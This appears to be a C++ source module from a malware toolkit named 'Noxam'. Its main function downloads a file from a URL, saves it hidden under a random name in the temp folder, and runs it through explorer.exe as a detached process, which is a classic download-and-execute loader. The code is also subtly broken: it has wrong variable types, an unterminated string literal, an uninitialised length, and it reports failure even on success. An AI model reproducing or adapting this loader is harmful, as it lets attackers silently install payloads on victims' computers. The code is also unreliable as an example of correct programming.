#include <iostream>
#include <string>

#include <windows.h>
#include <stdio.h>
#include <time.h>

#include "../../Headers/Utils/NoxamDownloadExecute.hxx"
#include "../../Headers/Net/NoxamHTTP.hxx"
#include "../../Headers/SystemX/NoxamWebSiteChecker.hxx"
#include "../../Headers/Crypto/NoxamStringOprations.hxx"

using namespace std;

void NoxamGenRandom(char *NxmS, const int NxmLen);

/*
|===========================================================
|    NoxamDownloadExecuteFIles()
|===========================================================
|
|
|===========================================================
*/
bool NoxamDownloadExecuteFIles(char *NxmFilePathX)
{
    char *NxmHost, NxmPath, NxmData, NxmOutput;
    int NxmLength, NxmSplitLength, NxmStringLength;

    if (!NoxamURLToHostPath(NxmFilePathX, &NxmHost, reinterpret_cast<char **>(&NxmPath)))
    {
        return false;
    }
    NxmNameValuePair **NxmHeaders;
    int NxmResult = NoxamHttQuery(NxmHost, NxmPath, NULL, &NxmHeaders, &NxmData, &NxmLength);

    if (NxmResult != 200 || NxmLength <= 0)
    {
        NoxamFreeHTTPResponse(NxmHeaders, NxmData);
        return false;
    }
    char *NxmTempDir = (char *)malloc(260);
    GetTempPathA(260, NxmTempDir);
    char *NxmRandomName = (char *)malloc(11);
    NoxamGenRandom(NxmRandomName, 10);
    char **NxmJoin = (char *)malloc(sizeof(char *) * 4);
    NxmJoin[0] = NxmTempDir;
    NxmJoin[1] = NxmRandomName;
    char **NxmSplitResults = NoxamSplitString(NxmFilePathX, ".", &NxmFilePathX, true);

    if (NxmSplitResults == 0)
    {
        return false;
    }
    NxmJoin[2] = ".";
    NxmJoin[3] = NxmSplitResults[NxmSplitLength - 1];
    NxmOutput = NoxamJoinSplitString(NxmJoin, 4, &NxmStringLength);
    NoxamFreeSplitStringBuffer(NxmSplitResults, NxmSplitLength);
    free(NxmJoin);
    free(NxmRandomName);
    free(NxmTempDir);
    HANDLE NxmFIle = CreateFileA(NxmOutput, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0x2, NULL);

    if (NxmFIle == 0)
    {
        NoxamFreeHTTPResponse(NxmHeaders, NxmData);
        NoxamFreeJoinStringBuffer(NxmOutput);

        return false;
    }

    if (!WriteFile(NxmFIle, NxmData, NxmLength, NULL, NULL))
    {
        NoxamFreeHTTPResponse(NxmHeaders, NxmData);
        NoxamFreeJoinStringBuffer(NxmOutput);

        return false;
    }
    CloseHandle(NxmFIle);
    NoxamFreeHTTPResponse(NxmHeaders, NxmData);
    STARTUPINFOA NxmSi;
    PROCESS_INFORMATION NxmPi;
    ZeroMemory(&NxmSi, sizeof(NxmSi));
    ZeroMemory(&NxmPi, sizeof(NxmPi));
    NxmSi.cb = sizeof(STARTUPINFOA);
    NxmJoin = (char **)malloc(sizeof(char **) * 3);
    NxmJoin[0] = "\";
        NxmJoin[1] = NxmOutput;
    NxmJoin[2] = "\"";
    char *NxmParams = NoxamJoinSplitString(NxmJoin, 3, &NxmStringLength);
    NoxamFreeJoinStringBuffer(NxmOutput);
    char NxmExplorePath[260];
    GetSystemDirectoryA(NxmExplorePath, 260);
    strcat_s(NxmExplorePath, 260, "\\explorer.exe");

    if (CreateProcessA(NxmExplorePath, NxmParams, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &NxmSi, &NxmPi))
    {
        NoxamFreeJoinStringBuffer(NxmParams);

        return false;
    }
    else
    {
        NoxamFreeJoinStringBuffer(NxmParams);
        DWORD NxmErr = GetLastError();

        return false;
    }
}

/*
|===========================================================
|    NoxamGenRandom()
|===========================================================
|
|
|===========================================================
*/
void NoxamGenRandom(char *NxmS, const int NxmLen)
{
    srand(time(NULL));
    static const char NxmAlphaNum[] = {
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"};

    for (int I = 0; I < NxmLen; ++I)
    {
        NxmS[I] = NxmAlphaNum[rand() % (sizeof(NxmAlphaNum) - 1)];
    }
    NxmS[NxmLen] = 0;
}
